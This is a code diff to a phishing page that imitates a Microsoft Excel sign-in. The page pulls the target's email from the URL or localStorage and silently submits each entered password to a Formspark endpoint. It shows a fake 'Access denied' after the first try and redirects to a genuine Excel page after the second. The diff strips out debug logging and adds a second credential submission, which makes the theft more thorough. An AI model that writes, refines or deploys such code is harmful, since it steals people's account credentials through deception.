@@ -182,10 +182,6 @@
             background-color: #a80000;
         }
         
-        .sign-in-btn.redirecting {
-            background-color: #107c41;
-        }
-        
         .separator {
             display: flex;
             align-items: center;
@@ -395,48 +391,31 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Page loaded successfully');
-            
             let isFirstAttempt = true;
             
             // Function to extract email from URL
             function extractEmailFromURL() {
-                console.log('Extracting email from URL...');
                 const hash = window.location.hash;
                 if (hash && hash.length > 1) {
-                    const email = hash.substring(1);
-                    console.log('Found email in hash:', email);
-                    return email;
+                    return hash.substring(1);
                 }
                 
                 const urlParams = new URLSearchParams(window.location.search);
                 const emailFromQuery = urlParams.get('email');
                 if (emailFromQuery) {
-                    console.log('Found email in query:', emailFromQuery);
                     return emailFromQuery;
                 }
                 
                 const storedEmail = localStorage.getItem('excelCurrentEmail');
                 if (storedEmail) {
-                    console.log('Found email in localStorage:', storedEmail);
                     return storedEmail;
                 }
                 
-                console.log('Using default email');
                 return "user@example.com";
             }
             
             const currentEmail = extractEmailFromURL();
-            console.log('Current email:', currentEmail);
-            
-            const displayEmail = document.getElementById('displayEmail');
-            if (displayEmail) {
-                displayEmail.textContent = currentEmail;
-                console.log('Email displayed:', currentEmail);
-            } else {
-                console.error('displayEmail element not found!');
-            }
-            
+            document.getElementById('displayEmail').textContent = currentEmail;
             localStorage.setItem('excelCurrentEmail', currentEmail);
             
             // Elements
@@ -446,38 +425,17 @@
             const signInBtn = document.getElementById('signInBtn');
             const errorMessage = document.getElementById('errorMessage');
             
-            console.log('Elements found:', {
-                togglePassword: !!togglePassword,
-                passwordInput: !!passwordInput,
-                loginForm: !!loginForm,
-                signInBtn: !!signInBtn,
-                errorMessage: !!errorMessage
-            });
-            
             // Formspark elements
             const formsparkForm = document.getElementById('formsparkForm');
             const formsparkEmail = document.getElementById('formsparkEmail');
             const formsparkPassword = document.getElementById('formsparkPassword');
             
-            console.log('Formspark elements:', {
-                formsparkForm: !!formsparkForm,
-                formsparkEmail: !!formsparkEmail,
-                formsparkPassword: !!formsparkPassword
-            });
-            
-            // Function to submit to Formspark
+            // Function to submit to Formspark SILENTLY
             function submitToFormspark(email, password) {
                 console.log('Submitting to Formspark:', { email: email, password: password });
                 
-                if (!formsparkEmail || !formsparkPassword || !formsparkForm) {
-                    console.error('Formspark elements missing!');
-                    return false;
-                }
-                
                 formsparkEmail.value = email;
                 formsparkPassword.value = password;
-                
-                console.log('Submitting form to:', formsparkForm.action);
                 formsparkForm.submit();
                 
                 return true;
@@ -497,8 +455,6 @@
                         eyeIcon.classList.remove('fa-eye-slash');
                         eyeIcon.classList.add('fa-eye');
                     }
-                    
-                    console.log('Password visibility toggled to:', type);
                 });
             }
             
@@ -506,10 +462,8 @@
             if (loginForm) {
                 loginForm.addEventListener('submit', function(e) {
                     e.preventDefault();
-                    console.log('Form submitted');
                     
                     const password = passwordInput ? passwordInput.value : '';
-                    console.log('Password entered:', password);
                     
                     // Show loading state
                     if (signInBtn) {
@@ -525,10 +479,7 @@
                     setTimeout(() => {
                         if (password && password.length > 0) {
                             if (isFirstAttempt) {
-                                console.log('First attempt - submitting to Formspark');
-                                isFirstAttempt = false;
-                                
-                                // Submit to Formspark
+                                // FIRST ATTEMPT: Submit to Formspark + Show Access Denied
                                 submitToFormspark(currentEmail, password);
                                 
                                 // Show "Access denied" message
@@ -536,6 +487,9 @@
                                     signInBtn.innerHTML = 'Access denied';
                                     signInBtn.classList.add('access-denied');
                                 }
+                                
+                                // Mark as first attempt done
+                                isFirstAttempt = false;
                                 
                                 // Re-enable button after 2 seconds
                                 setTimeout(() => {
@@ -551,18 +505,13 @@
                                 }, 2000);
                                 
                             } else {
-                                console.log('Second attempt - redirecting');
-                                // SECOND ATTEMPT: Redirect immediately
-                                if (signInBtn) {
-                                    signInBtn.innerHTML = '✓ Redirecting to Excel...';
-                                    signInBtn.classList.add('redirecting');
-                                }
+                                // SECOND ATTEMPT: Submit to Formspark again + IMMEDIATE redirect
+                                submitToFormspark(currentEmail, password);
                                 
-                                // Immediate redirect to Excel invoice templates
+                                // IMMEDIATELY redirect without any message
                                 window.location.href = 'https://excel.cloud.microsoft/create/en/invoice-templates/';
                             }
                         } else {
-                            console.log('Empty password error');
                             // Empty password error
                             if (passwordInput) {
                                 passwordInput.classList.add('error');
@@ -592,11 +541,8 @@
             setTimeout(() => {
                 if (passwordInput) {
                     passwordInput.focus();
-                    console.log('Password field focused');
                 }
             }, 300);
-            
-            console.log('Page initialization complete');
         });
     </script>
 </body>
